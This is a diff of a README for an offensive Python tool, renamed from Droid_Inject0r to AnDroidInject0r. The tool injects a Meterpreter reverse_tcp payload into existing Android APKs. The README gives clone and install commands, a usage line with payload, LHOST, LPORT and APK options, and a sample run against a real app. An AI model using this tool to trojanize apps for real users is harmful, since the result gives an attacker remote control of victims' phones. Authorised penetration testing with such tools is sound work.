@@ -1,6 +1,6 @@
-# Droid_Inject0r
+# AnDroidInject0r
 
-Droid_Inject0r is a Python script to inject existing Android applications with a Meterpreter payload. It can be used during penetrating testing or security assessments.
+AnDroidInject0r is a Python script to inject existing Android applications with a Meterpreter payload. It can be used during penetrating testing or security assessments.
 
 
 [![asciicast](https://asciinema.org/a/ajlfaPCAmWbWT4Ie0GDmLshjy.png)](https://asciinema.org/a/ajlfaPCAmWbWT4Ie0GDmLshjy)
@@ -15,15 +15,15 @@ Droid_Inject0r is a Python script to inject existing Android applications with a
 
 Firstly get the code:
 ```
-git clone https://github.com/yasserjanah/Droid_Inject0r.git
-cd Droid_Inject0r/
+git clone https://github.com/yasserjanah/AnDroidInject0r.git
+cd AnDroidInject0r/
 chmod +x install_requirements.sh
 ./install_requirements.sh
 ```
 # Usage
 
 ```
-Usage: python2 Droid_apk_Inject0r.py -p [PAYLOAD] --lhost=[LHOST] --lport=[PORT] --apkfile=[APKFILE]
+Usage: python2 AnDroidInject0r.py -p [PAYLOAD] --lhost=[LHOST] --lport=[PORT] --apkfile=[APKFILE]
     << Coded by : Yasser Janah >>
     << Facebook : https://facebook.com/yasser.janah >>
     << Twitter  : https://twitter.com/yasser_janah >>
@@ -36,7 +36,7 @@ Usage: python2 Droid_apk_Inject0r.py -p [PAYLOAD] --lhost=[LHOST] --lport=[PORT]
 
 # Need just select the apkfile 
 ```
-$ ./Droid_apk_Inject0r.py --apkfile zarchiver0-8-3.apk
+$ ./AnDroidInject0r.py --apkfile zarchiver0-8-3.apk
 
 [*] payload not selected .. default 'android/meterpreter/reverse_tcp'
 [*] LHOST not selected .. using '192.168.43.230'
